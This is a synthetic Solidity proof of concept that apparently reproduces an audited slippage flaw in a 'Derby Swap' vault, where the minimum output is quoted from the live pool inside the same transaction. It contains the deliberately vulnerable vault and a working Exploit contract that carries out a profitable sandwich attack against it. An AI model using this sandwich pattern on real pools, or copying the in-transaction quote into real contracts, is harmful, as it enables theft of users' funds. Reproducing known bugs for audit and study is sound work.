// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Derby Swap.swapTokensMulti — slippage is quoted inside the swap (Sherlock H-13, AuditVault 12295).
   SYNTHETIC, cheatcode-free. amountOutMinimum is quoteExactInput of the live pool, so a
   same-transaction sell sets the floor to the already-manipulated price. */

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function pull(address from, address to, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

interface IQuoter {
    function quoteExactInput(bytes memory path, uint256 amountIn) external view returns (uint256);
}

interface ISwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params) external returns (uint256);
}

contract UniRouter is IQuoter, ISwapRouter {
    Token public tokenIn;
    Token public tokenOut;
    uint256 public reserveIn = 1000 ether;
    uint256 public reserveOut = 1000 ether;

    constructor(Token _in, Token _out) {
        tokenIn = _in;
        tokenOut = _out;
    }

    function quoteExactInput(bytes memory, uint256 amountIn) public view returns (uint256) {
        return amountIn * reserveOut / (reserveIn + amountIn);
    }

    function exactInput(ExactInputParams calldata params) external returns (uint256 amountOut) {
        amountOut = quoteExactInput(params.path, params.amountIn);
        require(amountOut >= params.amountOutMinimum, "Too little received");
        tokenIn.pull(msg.sender, address(this), params.amountIn);
        reserveIn += params.amountIn;
        reserveOut -= amountOut;
        tokenOut.transfer(params.recipient, amountOut);
    }

    function sellTokenIn(uint256 amountIn, address recipient) external returns (uint256 amountOut) {
        amountOut = quoteExactInput("", amountIn);
        tokenIn.pull(msg.sender, address(this), amountIn);
        reserveIn += amountIn;
        reserveOut -= amountOut;
        tokenOut.transfer(recipient, amountOut);
    }

    function sellTokenOut(uint256 amountOutIn, address recipient) external returns (uint256 amountIn) {
        amountIn = amountOutIn * reserveIn / (reserveOut + amountOutIn);
        tokenOut.pull(msg.sender, address(this), amountOutIn);
        reserveOut += amountOutIn;
        reserveIn -= amountIn;
        tokenIn.transfer(recipient, amountIn);
    }
}

contract SwapVault {
    Token public tokenIn;
    Token public tokenOut;
    UniRouter public router;

    constructor(Token _in, Token _out, UniRouter _router) {
        tokenIn = _in;
        tokenOut = _out;
        router = _router;
    }

    function swapTokensMulti(uint256 amount) external returns (uint256) {
        uint256 amountOutMinimum = IQuoter(address(router)).quoteExactInput(
            abi.encodePacked(address(tokenIn), uint24(3000), address(tokenOut)),
            amount
        ); // @> VULN: min-out is the in-transaction spot quote, so a sandwich already in this tx sets the floor

        uint256 balanceBefore = tokenOut.balanceOf(address(this));
        ISwapRouter.ExactInputParams memory params = ISwapRouter.ExactInputParams({
            path: abi.encodePacked(address(tokenIn), uint24(3000), address(tokenOut)),
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amount,
            amountOutMinimum: amountOutMinimum
        });
        ISwapRouter(address(router)).exactInput(params);
        return tokenOut.balanceOf(address(this)) - balanceBefore;
    }
}

contract Exploit {
    Token public tokenIn; // nonce 1
    Token public tokenOut; // nonce 2
    UniRouter public router; // nonce 3
    SwapVault public vault; // nonce 4
    uint256 public vaultGot;
    uint256 public fairOut;
    uint256 public profit;

    constructor() {
        tokenIn = new Token();
        tokenOut = new Token();
        router = new UniRouter(tokenIn, tokenOut);
        vault = new SwapVault(tokenIn, tokenOut, router);
        tokenIn.mint(address(router), 1000 ether);
        tokenOut.mint(address(router), 1000 ether);
        tokenIn.mint(address(this), 333 ether);
        tokenIn.mint(address(vault), 500 ether);
    }

    function run() external {
        fairOut = uint256(500 ether) * 1000 / 1500;
        uint256 capital = tokenIn.balanceOf(address(this));

        router.sellTokenIn(333 ether, address(this));
        vaultGot = vault.swapTokensMulti(500 ether);
        router.sellTokenOut(tokenOut.balanceOf(address(this)), address(this));

        profit = tokenIn.balanceOf(address(this)) - capital;
        require(vaultGot < fairOut, "vault was not underpaid");
        require(profit > 0, "sandwich extracted nothing");
        require(tokenOut.balanceOf(address(vault)) == vaultGot, "vault kept the bad fill");
    }
}
